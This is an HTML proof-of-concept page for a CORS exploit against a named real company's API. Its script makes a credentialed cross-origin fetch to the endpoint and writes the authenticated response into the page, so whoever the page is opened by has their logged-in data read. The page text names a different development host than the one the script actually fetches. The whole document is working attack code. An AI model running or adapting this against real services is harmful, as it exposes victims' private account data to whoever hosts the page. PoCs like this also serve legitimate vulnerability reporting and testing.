<!DOCTYPE html>
<html>
  <head>
    <title>🔥 CORS Exploit PoC2</title>
  </head>
  <body>
    <h2>🔥 CORS Exploit PoC</h2>
    <p>Trying to fetch authenticated content from: <b>https://dq-testing-dev.corp.afterpay.com</b></p>
    <pre id="output"></pre>

    <script>
      fetch("https://connect.afterpay.com/some/api/endpoint", {
        method: "GET",
        credentials: "include"
      })
      .then(res => res.text())
      .then(data => {
        document.getElementById("output").textContent = data;
      })
      .catch(err => {
        document.getElementById("output").textContent = "❌ Error:\n" + err;
      });
    </script>
  </body>
